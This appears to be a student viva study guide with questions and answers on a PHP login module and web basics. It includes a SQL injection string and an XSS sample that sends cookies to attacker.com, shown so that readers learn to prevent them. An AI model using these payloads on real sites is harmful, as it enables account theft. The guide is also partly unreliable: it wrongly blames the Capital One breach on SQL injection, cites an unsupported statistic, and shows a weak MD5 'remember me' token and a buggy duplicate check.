# 📋 VIVA QUESTIONS & ANSWERS
## Lab Question 13: PHP Login Module

---

## 🎯 LAB-SPECIFIC QUESTIONS (Must Know!)

### **Q1: Explain the difference between sessions and cookies.**

**Answer:**

| Aspect | Sessions | Cookies |
|--------|----------|---------|
| **Storage Location** | Server (in files/database) | Client browser |
| **Security** | More secure (data hidden from user) | Less secure (user can view/modify) |
| **Size Limit** | No practical limit | ~4KB per cookie |
| **Lifetime** | Until browser closes or timeout | Can be set to expire after days/months |
| **Data Type** | Any PHP data type | String only |
| **Access** | Server-side only | Both client and server |
| **Example Use** | User login status, shopping cart | "Remember me", preferences |

**Real Example:**
```php
// Session (server-side)
$_SESSION['user_id'] = 123;  // Stored on server
$_SESSION['cart'] = ['item1', 'item2'];

// Cookie (client-side)
setcookie('remember_me', 'user123', time() + 86400);  // Stored in browser
```

---

### **Q2: How do sessions work in PHP? Explain the complete lifecycle.**

**Answer:**

**Step-by-Step Session Lifecycle:**

1. **Initialization (session_start())**
   - PHP checks if PHPSESSID cookie exists in browser
   - If yes, loads existing session data from server
   - If no, creates new session ID and sends as cookie

2. **Session ID Generation**
   - Random 32-character string (e.g., abc123xyz789...)
   - Stored in PHPSESSID cookie on client
   - Used as filename on server: sess_abc123xyz789

3. **Data Storage**
   - Session data stored in $_SESSION superglobal
   - Serialized and saved to server file/database
   - Format: key|value;key2|value2;

4. **Data Transmission**
   ```
   Browser → Request + PHPSESSID cookie → Server
   Server → Reads session file using session ID
   Server → Makes data available in $_SESSION
   ```

5. **Session Cleanup**
   ```php
   $_SESSION = array();              // Clear variables
   session_destroy();                // Delete session file
   setcookie(session_name(), '', time()-3600);  // Delete cookie
   ```

**Example:**
```php
// Start session
session_start();

// Store data
$_SESSION['username'] = 'john';
$_SESSION['role'] = 'admin';

// Access data on another page
session_start();
echo $_SESSION['username'];  // Outputs: john

// Destroy session
session_destroy();
```

---

### **Q3: What are prepared statements? Why are they important?**

**Answer:**

**Prepared Statements** separate SQL code from data, preventing SQL injection attacks.

**Without Prepared Statements (VULNERABLE):**
```php
$username = $_POST['username'];  // User inputs: admin' OR '1'='1
$query = "SELECT * FROM users WHERE username = '$username'";
// Becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// Returns ALL users! Security breach!
```

**With Prepared Statements (SECURE):**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
// The '?' is replaced safely, treating input as data, not SQL code
```

**How it Works:**
1. **Prepare:** SQL template sent to MySQL
2. **Bind:** Parameters attached separately
3. **Execute:** MySQL combines them safely
4. **Result:** SQL injection impossible

**Benefits:**
- ✅ Prevents SQL injection (99% of database attacks)
- ✅ Better performance (query cached)
- ✅ Handles special characters automatically

---

### **Q4: How do you implement "Remember Me" functionality?**

**Answer:**

**Implementation Steps:**

**1. When User Checks "Remember Me":**
```php
if (isset($_POST['remember_me'])) {
    // Create unique token
    $token = $username . ':' . md5($username . $password_hash);
    
    // Set cookie for 30 days
    $expiry = time() + (30 * 86400);  // 86400 = seconds in a day
    setcookie('remember_me', $token, $expiry, "/", "", false, true);
}
```

**2. On Next Visit (Auto-Login):**
```php
if (isset($_COOKIE['remember_me'])) {
    // Split cookie value
    list($username, $token) = explode(':', $_COOKIE['remember_me']);
    
    // Verify against database
    $stmt = $conn->prepare("SELECT id, password FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $user = $stmt->get_result()->fetch_assoc();
    
    // Check token matches
    if (md5($username . $user['password']) === $token) {
        // Auto-login: Create session
        $_SESSION['user_id'] = $user['id'];
        redirect('dashboard.php');
    }
}
```

**3. On Logout (Clear Cookie):**
```php
setcookie('remember_me', '', time() - 3600, "/");  // Expire in past
```

**Security Considerations:**
- ✅ Use httponly flag (prevents JavaScript access)
- ✅ Use secure flag for HTTPS sites
- ✅ Hash contains password hash (changes if password changes)
- ✅ Set expiry time (30 days recommended)

---

### **Q5: How is password security implemented in this system?**

**Answer:**

**Password Security Layers:**

**1. Hashing (password_hash)**
```php
// Registration
$plain_password = "MyPassword123";
$hashed = password_hash($plain_password, PASSWORD_DEFAULT);
// Result: $2y$10$abc123...xyz (60 characters)

// Storage
INSERT INTO users (password) VALUES ('$2y$10$abc123...xyz');
```

**Algorithm Breakdown:**
- `$2y$` → bcrypt algorithm identifier
- `10` → Cost factor (2^10 iterations)
- `abc123...` → Salt (random, prevents rainbow table attacks)
- `...xyz` → Hash output

**2. Verification (password_verify)**
```php
// Login
$stored_hash = $user['password'];  // From database
$input_password = $_POST['password'];  // From form

if (password_verify($input_password, $stored_hash)) {
    echo "Login successful!";
}
```

**Why This is Secure:**
- ✅ **One-way:** Cannot reverse hash to get password
- ✅ **Slow:** Takes ~0.1 seconds (prevents brute force)
- ✅ **Salted:** Same password → different hashes
- ✅ **Future-proof:** Algorithm can be upgraded

**Example:**
```
Password: "Hello123"
Hash 1: $2y$10$abcd...wxyz
Hash 2: $2y$10$efgh...ijkl  (Same password, different hash!)
```

**Common Mistakes to Avoid:**
- ❌ Storing plain passwords
- ❌ Using MD5 or SHA1 (too fast, insecure)
- ❌ Not salting hashes

---

### **Q6: What is SQL injection? How does this system prevent it?**

**Answer:**

**SQL Injection** is when attackers inject malicious SQL code through input fields.

**Attack Example:**
```php
// Vulnerable code
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '$username'";

// Attacker inputs: admin' OR '1'='1' --
// Query becomes:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
// Returns ALL users because '1'='1' is always true!
```

**Prevention in Our System:**

**1. Prepared Statements**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
// Even if input is: admin' OR '1'='1
// MySQL treats it as literal string, not SQL code
```

**2. Input Sanitization**
```php
function sanitize_input($data) {
    $data = trim($data);                    // Remove whitespace
    $data = stripslashes($data);            // Remove slashes
    $data = htmlspecialchars($data);        // Convert < > to &lt; &gt;
    return $data;
}
```

**3. Validation**
```php
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Invalid username format");
}
```

**Real-World Impact:**
- 2019: Capital One breach (SQL injection)
- Loss: 100 million customer records
- Cost: $80 million fine

---

### **Q7: Explain the cookie parameters in setcookie().**

**Answer:**

**setcookie() Syntax:**
```php
setcookie(name, value, expire, path, domain, secure, httponly);
```

**Parameter Breakdown:**

**1. name** (string)
- Cookie identifier
- Example: 'remember_me', 'user_pref'

**2. value** (string)
- Data to store
- Example: 'user123:token456'
- Limit: ~4KB

**3. expire** (int, timestamp)
- When cookie expires
- `0` = Session cookie (deleted when browser closes)
- `time() + 86400` = 1 day from now
- `time() + (30 * 86400)` = 30 days

**4. path** (string)
- URL path where cookie is valid
- `/` = Available site-wide
- `/admin` = Only in /admin directory

**5. domain** (string)
- Domain where cookie is valid
- `''` = Current domain only
- `.example.com` = All subdomains

**6. secure** (boolean)
- `true` = Send only over HTTPS
- `false` = Send over HTTP/HTTPS
- Use `true` in production!

**7. httponly** (boolean)
- `true` = Not accessible via JavaScript
- `false` = Can be read by JavaScript
- Use `true` for security cookies!

**Example:**
```php
// Secure "Remember Me" cookie
setcookie(
    'remember_me',              // name
    'user123:abc789',           // value
    time() + (30 * 86400),      // expires in 30 days
    '/',                        // path: site-wide
    '',                         // domain: current
    false,                      // secure: false for localhost, true for production
    true                        // httponly: prevents XSS
);
```

**Security Best Practices:**
```php
// Production settings
setcookie('auth_token', $token, $expiry, '/', '.yoursite.com', true, true);
//                                                             ^^^^  ^^^^ 
//                                                           HTTPS  No JS
```

---

### **Q8: What is XSS (Cross-Site Scripting)? How is it prevented?**

**Answer:**

**XSS Attack** is when attackers inject malicious JavaScript into your website.

**Attack Example:**
```php
// Vulnerable code
$comment = $_POST['comment'];
echo $comment;  // Direct output

// Attacker inputs:
<script>
    // Steal cookies and send to attacker
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// This script executes in victim's browser!
```

**Prevention Methods:**

**1. htmlspecialchars() Function**
```php
$comment = $_POST['comment'];
$safe = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
echo $safe;

// Input: <script>alert('XSS')</script>
// Output: &lt;script&gt;alert('XSS')&lt;/script&gt;
// Browser displays as text, doesn't execute!
```

**2. strip_tags() Function**
```php
$comment = strip_tags($_POST['comment'], '<b><i>');  // Allow only <b> and <i>
```

**3. Content Security Policy (CSP)**
```php
header("Content-Security-Policy: default-src 'self'");
// Blocks all external scripts
```

**Real Example in Our Code:**
```php
// Always sanitize before display
echo htmlspecialchars($user['username']);
echo htmlspecialchars($user['full_name']);

// Never do this:
echo $_POST['username'];  // DANGEROUS!
```

**Impact:**
- Steal session cookies
- Redirect to phishing sites
- Modify page content
- Steal sensitive data

---

### **Q9: Explain the registration process flow in your system.**

**Answer:**

**Complete Registration Flow:**

```
User Fills Form
      ↓
JavaScript Validation (Client-Side)
      ↓
Form Submitted (POST method)
      ↓
PHP Receives Data
      ↓
[1] Sanitize Input
    - trim() → Remove spaces
    - stripslashes() → Remove backslashes
    - htmlspecialchars() → Prevent XSS
      ↓
[2] Server-Side Validation
    - Check empty fields
    - Validate email format (filter_var)
    - Check password strength (regex)
    - Confirm password match
      ↓
[3] Database Check (Prepared Statement)
    SELECT id FROM users WHERE username = ? OR email = ?
    - If exists → Error: "Username/email taken"
      ↓
[4] Password Hashing
    $hash = password_hash($password, PASSWORD_DEFAULT);
    // Never store plain text!
      ↓
[5] Insert into Database (Prepared Statement)
    INSERT INTO users (username, email, password, full_name) 
    VALUES (?, ?, ?, ?)
      ↓
[6] Log Activity
    Write to logs/activity.log
      ↓
[7] Flash Message
    $_SESSION['flash_message'] = 'Registration successful!'
      ↓
[8] Redirect to Login
    header('Location: login.php');
```

**Code Walkthrough:**
```php
// [1] Sanitize
$username = sanitize_input($_POST['username']);

// [2] Validate
if (strlen($username) < 3) {
    $errors[] = "Username too short";
}

// [3] Check duplicates
$stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
if ($stmt->num_rows > 0) {
    $errors[] = "Username exists";
}

// [4] Hash password
$hashed = password_hash($password, PASSWORD_DEFAULT);

// [5] Insert
$stmt = $conn->prepare("INSERT INTO users (username, email, password, full_name) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $username, $email, $hashed, $full_name);
$stmt->execute();
```

---

### **Q10: How does the login authentication process work?**

**Answer:**

**Complete Login Flow:**

```
User Enters Credentials
      ↓
Form Submitted (POST)
      ↓
[1] Sanitize Input
    $username = sanitize_input($_POST['username']);
      ↓
[2] Query Database (Prepared Statement)
    SELECT id, username, password, email, full_name 
    FROM users 
    WHERE username = ? OR email = ?
      ↓
[3] Check if User Exists
    if ($result->num_rows == 1) → Continue
    else → Error: "Invalid credentials"
      ↓
[4] Verify Password
    if (password_verify($input_password, $stored_hash))
        → Password correct
    else
        → Error: "Invalid credentials"
      ↓
[5] Create Session
    session_start();
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['email'] = $user['email'];
    $_SESSION['login_time'] = time();
      ↓
[6] Security: Regenerate Session ID
    session_regenerate_id(true);
    // Prevents session fixation attack
      ↓
[7] Remember Me Cookie (If Checked)
    $token = $username . ':' . md5($username . $password_hash);
    setcookie('remember_me', $token, time() + (30 * 86400));
      ↓
[8] Update Database
    UPDATE users SET last_login = NOW(), login_count = login_count + 1
      ↓
[9] Track Session in Database
    INSERT INTO user_sessions (session_id, user_id, ip_address, user_agent)
      ↓
[10] Log Activity
    log_activity("User logged in: $username");
      ↓
[11] Redirect to Dashboard
    header('Location: dashboard.php');
```

**Security Measures:**
- ✅ Password never stored in session
- ✅ Session ID regenerated (anti-hijacking)
- ✅ IP address logged (detect suspicious activity)
- ✅ Login attempts tracked (prevent brute force)

---

## 🌐 WEB TECHNOLOGY SYLLABUS QUESTIONS

### **Q11: What is the difference between GET and POST methods?**

**Answer:**

| Feature | GET | POST |
|---------|-----|------|
| **Data Visibility** | In URL (query string) | In request body (hidden) |
| **Security** | Less secure (data visible) | More secure |
| **Data Limit** | ~2048 characters | No limit |
| **Caching** | Can be cached | Not cached |
| **Bookmarkable** | Yes | No |
| **Use Case** | Retrieve data, search | Submit forms, file upload |

**Examples:**
```html
<!-- GET -->
<form method="GET" action="search.php">
    <input name="query" type="text">
</form>
<!-- URL: search.php?query=laptop -->

<!-- POST -->
<form method="POST" action="login.php">
    <input name="password" type="password">
</form>
<!-- Data hidden in request body -->
```

---

### **Q12: Explain the structure of an HTML5 document.**

**Answer:**

```html
<!DOCTYPE html>                    <!-- HTML5 document type -->
<html lang="en">                   <!-- Root element -->
<head>                            <!-- Metadata section -->
    <meta charset="UTF-8">        <!-- Character encoding -->
    <meta name="viewport" 
          content="width=device-width, initial-scale=1.0">  <!-- Responsive -->
    <title>Page Title</title>     <!-- Browser tab title -->
    <link rel="stylesheet" href="style.css">  <!-- External CSS -->
</head>
<body>                            <!-- Visible content -->
    <header>                      <!-- Page header -->
        <nav>Navigation</nav>
    </header>
    
    <main>                        <!-- Main content -->
        <article>Article</article>
        <section>Section</section>
    </main>
    
    <footer>                      <!-- Page footer -->
        Footer content
    </footer>
    
    <script src="script.js"></script>  <!-- External JavaScript -->
</body>
</html>
```

**Key Elements:**
- `<!DOCTYPE html>` → Declares HTML5
- `<meta charset="UTF-8">` → Supports all characters
- `<meta name="viewport">` → Mobile responsive
- Semantic tags: `<header>`, `<nav>`, `<main>`, `<footer>`, `<article>`

---

### **Q13: What is the DOM (Document Object Model)?**

**Answer:**

**DOM** is a programming interface that represents HTML as a tree structure.

**Tree Structure:**
```
document
  └── html
       ├── head
       │    ├── title
       │    └── meta
       └── body
            ├── header
            ├── main
            │    ├── section
            │    └── div
            └── footer
```

**Manipulation with JavaScript:**
```javascript
// Select element
let heading = document.getElementById('myHeading');

// Change content
heading.textContent = 'New Heading';

// Change style
heading.style.color = 'red';

// Create new element
let newDiv = document.createElement('div');
newDiv.textContent = 'Hello!';
document.body.appendChild(newDiv);

// Event handling
heading.addEventListener('click', function() {
    alert('Clicked!');
});
```

**DOM Levels:**
- **Level 0:** Basic document access
- **Level 1:** Core + HTML DOM
- **Level 2:** Events, CSS, Traversal
- **Level 3:** Load/Save, Validation

---

### **Q14: Explain CSS Box Model.**

**Answer:**

**Box Model Components:**
```
┌─────────────────────────────────┐
│         MARGIN (outside)        │
│  ┌───────────────────────────┐  │
│  │    BORDER                 │  │
│  │  ┌─────────────────────┐  │  │
│  │  │   PADDING           │  │  │
│  │  │  ┌───────────────┐  │  │  │
│  │  │  │   CONTENT     │  │  │  │
│  │  │  │ (width/height)│  │  │  │
│  │  │  └───────────────┘  │  │  │
│  │  └─────────────────────┘  │  │
│  └───────────────────────────┘  │
└─────────────────────────────────┘
```

**CSS Example:**
```css
.box {
    width: 200px;           /* Content width */
    height: 100px;          /* Content height */
    padding: 20px;          /* Inside spacing */
    border: 5px solid blue; /* Border */
    margin: 10px;           /* Outside spacing */
}

/* Total width = 200 + 20*2 + 5*2 + 10*2 = 270px */
```

**box-sizing Property:**
```css
/* Default */
box-sizing: content-box;    /* width = content only */

/* Better */
box-sizing: border-box;     /* width = content + padding + border */
```

---

### **Q15: What are JavaScript data types?**

**Answer:**

**Primitive Types:**

1. **Number**
   ```javascript
   let age = 25;
   let price = 99.99;
   let infinity = Infinity;
   ```

2. **String**
   ```javascript
   let name = "John";
   let message = 'Hello';
   let template = `Hi ${name}`;  // Template literal
   ```

3. **Boolean**
   ```javascript
   let isLoggedIn = true;
   let hasPermission = false;
   ```

4. **Undefined**
   ```javascript
   let x;  // undefined
   ```

5. **Null**
   ```javascript
   let user = null;  // Intentionally empty
   ```

6. **Symbol** (ES6)
   ```javascript
   let id = Symbol('unique');
   ```

7. **BigInt** (ES2020)
   ```javascript
   let big = 123456789012345678901234567890n;
   ```

**Reference Types:**

8. **Object**
   ```javascript
   let person = {
       name: "John",
       age: 30,
       greet: function() {
           console.log("Hello");
       }
   };
   ```

9. **Array**
   ```javascript
   let colors = ["red", "green", "blue"];
   ```

10. **Function**
    ```javascript
    function add(a, b) {
        return a + b;
    }
    ```

**Type Checking:**
```javascript
typeof 123           // "number"
typeof "hello"       // "string"
typeof true          // "boolean"
typeof undefined     // "undefined"
typeof null          // "object" (historical bug!)
typeof []            // "object"
typeof {}            // "object"
typeof function(){}  // "function"

// Better array check
Array.isArray([])    // true
```

---

### **Q16: What is AJAX? How does it work?**

**Answer:**

**AJAX** = Asynchronous JavaScript And XML
- Load data without page refresh
- Update parts of page dynamically
- Better user experience

**How It Works:**
```
1. User triggers event (click button)
   ↓
2. JavaScript creates XMLHttpRequest
   ↓
3. Send request to server (asynchronously)
   ↓
4. Server processes request
   ↓
5. Server sends response (JSON/XML/HTML)
   ↓
6. JavaScript receives response
   ↓
7. Update page content (no refresh!)
```

**Example:**
```javascript
// Modern way (Fetch API)
fetch('get_data.php')
    .then(response => response.json())
    .then(data => {
        document.getElementById('result').innerHTML = data.message;
    })
    .catch(error => console.error('Error:', error));

// Old way (XMLHttpRequest)
let xhr = new XMLHttpRequest();
xhr.open('GET', 'get_data.php', true);
xhr.onload = function() {
    if (xhr.status === 200) {
        let data = JSON.parse(xhr.responseText);
        console.log(data);
    }
};
xhr.send();
```

**PHP Server Side:**
```php
// get_data.php
header('Content-Type: application/json');
$data = [
    'message' => 'Hello from server!',
    'timestamp' => time()
];
echo json_encode($data);
```

**Benefits:**
- ✅ No page refresh
- ✅ Faster loading
- ✅ Better UX
- ✅ Reduced server load

---

### **Q17: What is Bootstrap? Why use it?**

**Answer:**

**Bootstrap** is a CSS framework for responsive, mobile-first web development.

**Key Features:**

**1. Grid System (12-column)**
```html
<div class="container">
    <div class="row">
        <div class="col-md-6">Left Half</div>
        <div class="col-md-6">Right Half</div>
    </div>
</div>
```

**2. Pre-built Components**
```html
<!-- Button -->
<button class="btn btn-primary">Click Me</button>

<!-- Alert -->
<div class="alert alert-success">Success!</div>

<!-- Card -->
<div class="card">
    <div class="card-body">
        <h5 class="card-title">Title</h5>
        <p class="card-text">Content</p>
    </div>
</div>
```

**3. Responsive Design**
```html
<!-- Classes for different screen sizes -->
<div class="col-xs-12 col-sm-6 col-md-4 col-lg-3">
    Responsive column
</div>
```

**4. Utility Classes**
```html
<div class="mt-3 mb-2 text-center bg-primary text-white">
    Styled div
</div>
```

**Why Use Bootstrap:**
- ✅ Saves development time
- ✅ Mobile-responsive by default
- ✅ Cross-browser compatible
- ✅ Consistent design
- ✅ Active community support

**Including Bootstrap:**
```html
<!-- CDN -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
```

---

### **Q18: What is jQuery? Give examples.**

**Answer:**

**jQuery** is a JavaScript library that simplifies:
- DOM manipulation
- Event handling
- AJAX requests
- Animations

**jQuery vs Vanilla JavaScript:**

**Selecting Elements:**
```javascript
// jQuery
$('#myId')
$('.myClass')
$('div')

// Vanilla JS
document.getElementById('myId')
document.getElementsByClassName('myClass')
document.querySelectorAll('div')
```

**Event Handling:**
```javascript
// jQuery
$('#btn').click(function() {
    alert('Clicked!');
});

// Vanilla JS
document.getElementById('btn').addEventListener('click', function() {
    alert('Clicked!');
});
```

**DOM Manipulation:**
```javascript
// jQuery
$('#myDiv').html('<p>New content</p>');
$('#myDiv').css('color', 'red');
$('#myDiv').hide();

// Vanilla JS
document.getElementById('myDiv').innerHTML = '<p>New content</p>';
document.getElementById('myDiv').style.color = 'red';
document.getElementById('myDiv').style.display = 'none';
```

**AJAX:**
```javascript
// jQuery
$.ajax({
    url: 'data.php',
    type: 'GET',
    success: function(data) {
        console.log(data);
    }
});

// Vanilla JS
fetch('data.php')
    .then(response => response.json())
    .then(data => console.log(data));
```

**Animations:**
```javascript
// jQuery
$('#box').fadeIn(1000);
$('#box').slideUp(500);
$('#box').animate({
    width: '200px',
    opacity: 0.5
}, 1000);
```

**Including jQuery:**
```html
<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
```

---

### **Q19: What is JSON? Why is it used?**

**Answer:**

**JSON** = JavaScript Object Notation
- Lightweight data format
- Human-readable
- Language-independent

**Syntax:**
```json
{
    "name": "John Doe",
    "age": 30,
    "email": "john@example.com",
    "isActive": true,
    "skills": ["PHP", "JavaScript", "MySQL"],
    "address": {
        "city": "Mumbai",
        "country": "India"
    }
}
```

**PHP Usage:**
```php
// PHP to JSON
$data = [
    'name' => 'John',
    'age' => 30
];
$json = json_encode($data);
// Output: {"name":"John","age":30}

// JSON to PHP
$json = '{"name":"John","age":30}';
$data = json_decode($json, true);  // true = associative array
echo $data['name'];  // John
```

**JavaScript Usage:**
```javascript
// JavaScript object to JSON
let obj = {name: 'John', age: 30};
let json = JSON.stringify(obj);
// Output: '{"name":"John","age":30}'

// JSON to JavaScript object
let json = '{"name":"John","age":30}';
let obj = JSON.parse(json);
console.log(obj.name);  // John
```

**Why Use JSON:**
- ✅ API data exchange (REST APIs)
- ✅ Configuration files
- ✅ Data storage (NoSQL databases)
- ✅ Lighter than XML
- ✅ Native JavaScript support

**JSON vs XML:**
```json
// JSON
{"name": "John", "age": 30}

<!-- XML -->
<person>
    <name>John</name>
    <age>30</age>
</person>

// JSON is shorter and faster to parse!
```

---

### **Q20: Explain PHP file handling functions.**

**Answer:**

**File Operations:**

**1. Opening Files (fopen)**
```php
$file = fopen("file.txt", "r");  // Read mode

// Modes:
// r  = Read (file must exist)
// w  = Write (creates/truncates file)
// a  = Append (adds to end)
// r+ = Read/Write
// w+ = Read/Write (truncates)
// a+ = Read/Append
```

**2. Reading Files**
```php
// Read entire file
$content = file_get_contents("file.txt");

// Read line by line
$file = fopen("file.txt", "r");
while (!feof($file)) {
    $line = fgets($file);
    echo $line;
}
fclose($file);

// Read specific bytes
$file = fopen("file.txt", "r");
$data = fread($file, 100);  // Read 100 bytes
fclose($file);
```

**3. Writing Files**
```php
// Write entire content
file_put_contents("file.txt", "Hello World");

// Write with fopen
$file = fopen("file.txt", "w");
fwrite($file, "Hello World\n");
fwrite($file, "Second line\n");
fclose($file);

// Append to file
file_put_contents("log.txt", "New entry\n", FILE_APPEND);
```

**4. File Information**
```php
if (file_exists("file.txt")) {
    echo "File exists";
}

if (is_readable("file.txt")) {
    echo "Can read";
}

if (is_writable("file.txt")) {
    echo "Can write";
}

$size = filesize("file.txt");  // Bytes
$type = filetype("file.txt");  // file/dir
```

**5. Deleting Files**
```php
if (unlink("file.txt")) {
    echo "File deleted";
}
```

**6. Directory Operations**
```php
// Create directory
mkdir("uploads");

// List files
$files = scandir("uploads");
foreach ($files as $file) {
    echo $file . "\n";
}

// Delete directory
rmdir("uploads");  // Must be empty!
```

**Example: Activity Log**
```php
function log_activity($message) {
    $file = fopen("activity.log", "a");
    $timestamp = date("Y-m-d H:i:s");
    $entry = "[$timestamp] $message\n";
    fwrite($file, $entry);
    fclose($file);
}

log_activity("User logged in");
log_activity("User logged out");
```

---

## 🎯 QUICK FIRE QUESTIONS

**Q21: What does $_SESSION do?**
**A:** Stores data on server that persists across multiple page requests for a specific user.

**Q22: What is the default session lifetime?**
**A:** Until browser closes or 24 minutes of inactivity (configurable in php.ini).

**Q23: Where are sessions stored?**
**A:** On server, typically in `/tmp` directory as files named `sess_[session_id]`.

**Q24: Can cookies store arrays?**
**A:** No, only strings. Must serialize/JSON encode arrays first.

**Q25: Maximum cookie size?**
**A:** ~4KB (4096 bytes).

**Q26: What is CSRF?**
**A:** Cross-Site Request Forgery - attacker tricks user into submitting unwanted requests. Prevented with tokens.

**Q27: What is mysqli_real_escape_string?**
**A:** Function to escape special characters in SQL queries (but prepared statements are better).

**Q28: What is password_hash algorithm?**
**A:** Bcrypt (default), more secure than MD5/SHA1.

**Q29: Can you decode password_hash?**
**A:** No, it's one-way. Use password_verify() to check.

**Q30: What is the difference between include and require?**
**A:** Both include files, but `require` throws fatal error if file not found, `include` only shows warning.

---

**Practice these answers thoroughly for your viva! Good luck! 🎓**
